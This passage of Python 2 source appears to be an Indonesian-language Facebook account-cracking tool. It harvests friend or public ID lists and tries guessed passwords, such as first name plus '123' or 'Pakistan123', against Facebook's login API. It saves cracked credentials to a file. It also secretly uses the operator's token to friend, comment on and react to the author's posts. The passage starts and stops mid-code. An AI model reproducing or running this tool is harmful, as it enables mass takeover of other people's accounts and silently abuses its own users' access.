logo20 = '\n\x1b[1;94m  /$$$$$$  /$$$$$$$  /$$   /$$ /$$$$$$$ \n\x1b[1;95m /$$__  $$| $$__  $$| $$  | $$| $$__  $$\n\x1b[1;94m| $$  \\__/| $$  \\ $$| $$  | $$| $$  \\ $$\n\x1b[1;95m| $$ /$$$$| $$$$$$$/| $$  | $$| $$$$$$$/\n\x1b[1;94m| $$|_  $$| $$__  $$| $$  | $$| $$____/ \n\x1b[1;95m| $$  \\ $$| $$  \\ $$| $$  | $$| $$      \n\x1b[1;95m|  $$$$$$/| $$  | $$|  $$$$$$/| $$      \n\x1b[1;95m \\______/ |__/  |__/ \\______/ |__/      \n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;92m01\x1b[1;97m}\x1b[1;92m Login Token Facebook'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;92m02\x1b[1;97m}\x1b[1;92m Download Token App'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;92m03\x1b[1;97m}\x1b[1;92m Login Dengan Facebook'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}\x1b[1;91m Keluar'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;93mPilih Mana Man?\x1b[91m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Salah Pilih Yang Benar...!'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        ambil_token()
    elif msuk == '3' or msuk == '03':
        login()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Salah Pilih Yang Benar...!'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo3
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    toket = raw_input('\x1b[1;91m[+]\x1b[1;95mMasukan Token \x1b[1;91m:\x1b[1;94m ')
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\n\x1b[1;95mLogin Berhasil.\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2..'
        bot_komen()
    except KeyError:
        print '\x1b[1;91m[!] Token Salah'
        print '\x1b[1;92m[!] Token Anda Mungkin Terkena Chekpoint'
        masuk()


def ambil_token():
    os.system('clear')
    print logo
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
    time.sleep(2)
    masuk()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo2
        print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
        jalan('\x1b[1;96m[\xe2\x9c\xbe]\x1b[1;91mJANGAN GUNAKAN AKUN OLD UNTUK LOGIN\x1b[1;96m[\xe2\x9c\xbe]')
        time.sleep(0.05)
        jalan('\x1b[1;96m[\xe2\x9c\xbe]\x1b[1;91mUSAHAKAN AKUN BARU UNTUK LOGIN\x1b[1;96m[\xe2\x9c\xbe]')
        print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
        id = raw_input('\x1b[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
        pwd = raw_input('\x1b[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
        menu()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;97mTidak ada koneksi internet'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;95mLogin Successful.\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2..'
                os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                bot_komen()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;97mTidak ada koneksi internet'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;97mSepertinya Akun Anda Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;94mPassword/Email Salah!'
            os.system('rm -rf login.txt')
            time.sleep(1)
            masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token Terhapus'
        os.system('rm -rf login.txt')

    una = '100007639052164'
    kom = 'Gua Pake Sc Lu Bang\xf0\x9f\x98\x98 \xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '2636809663250310'
    post2 = '2636809663250310'
    kom2 = 'Sc Nya Keren Bang\xf0\x9f\x98\x81 \xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '{!} Token Terhapus !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken Terhapus'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '{!} Tidak ada koneksi internet'
        keluar()

    os.system('clear')
    print logo4
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAMA\x1b[1;90m    =>\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =>\x1b[1;92m ' + id
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{' + warni + '01\x1b[1;97m}' + warna + ' \x1b[1;95mClone Dari Teman/Publik'
    print '\x1b[1;97m{' + warni + '02\x1b[1;97m}' + warna + ' \x1b[1;95mClone Dari Post  Grup/Teman'
    print '\x1b[1;97m{' + warni + '03\x1b[1;97m}' + warna + ' \x1b[1;95mClone Dari Total Followers'
    print '\x1b[1;97m{' + warni + '04\x1b[1;97m}' + warna + ' \x1b[1;95mUsername Akun Ubah Menjadi ID'
    print '\x1b[1;97m{' + warni + '05\x1b[1;97m}' + warna + ' \x1b[1;92mUpdate Tools'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warna + '\x1b[1;91m Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;92mPilih Mana Man? \x1b[91m:\x1b[1;92m ')
    if unikers == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m  Salah Pilih Yang Benar...!'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        crack_follow()
    elif unikers == '4' or unikers == '04':
        user_id()
    elif unikers == '5' or unikers == '05':
        perbarui()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Token terhapus')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
        pilih()


def crack_teman():
    os.system('clear')
    print logo5
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{' + warna + '01\x1b[1;97m}' + warni + '\x1b[1;93m Hack Pakistan '
    print '\x1b[1;97m{' + warna + '02\x1b[1;97m}' + warni + '\x1b[1;93m Hack Bangladesh '
    print '\x1b[1;97m{' + warna + '03\x1b[1;97m}' + warni + '\x1b[1;93m Hack Usa '
    print '\x1b[1;97m{' + warna + '04\x1b[1;97m}' + warni + '\x1b[1;93m Hack Indonesia '
    print '\x1b[1;97m{' + warna + '05\x1b[1;97m}' + warni + '\x1b[1;93m Hack Malaysia '
    print '\x1b[1;97m{' + warna + '06\x1b[1;97m}' + warni + '\x1b[1;93m Hack India '
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warni + ' Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_teman()


def pilih_teman():
    univ = raw_input('' + warna + 'Pilih Mana Man?\x1b[91m:\x1b[1;92m ')
    if univ == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
        pilih_teman()
    elif univ == '1' or univ == '01':
        crack_pakis()
    elif univ == '2' or univ == '02':
        crack_bangla()
    elif univ == '3' or univ == '03':
        crack_usa()
    elif univ == '4' or univ == '04':
        crack_indo()
    elif univ == '5' or univ == '04':
        crack_malay()
    elif univ == '6' or univ == '04':
        crack_india()
    elif univ == '7' or univ == '05':
        univ()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Pilih Yang Benar...!'
        pilih_teman()


def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken Terhapus'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo6
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack Dari daftar Teman'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack Dari Daftar Teman Publik'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_pakis()


def pilih_pakis():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;93mPilih Mana Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
        pilih_()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo16
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a \x1b[1;97mCRACK PAKISTAN \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo16
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '        \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a \x1b[1;97mCRACK PAKISTAN \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m}\x1b[1;93m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik / teman tidak ada !'
                raw_input('\n\x1b[1;93m{\x1b[1;97m<Keluar>\x1b[1;93m}')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo16
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mNama File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mKeluar \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                    raw_input('\n\x1b[1;93m{\x1b[1;97m<Keluar>\x1b[1;93m}')
                    crack_indo()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Salah Pilih Yang Benar...!'
                pilih_pakis()
            print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop Tekan CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mCraker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S \x1b[1;97m' + str(len(zowe)))))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Pakistan'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Pakistan123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
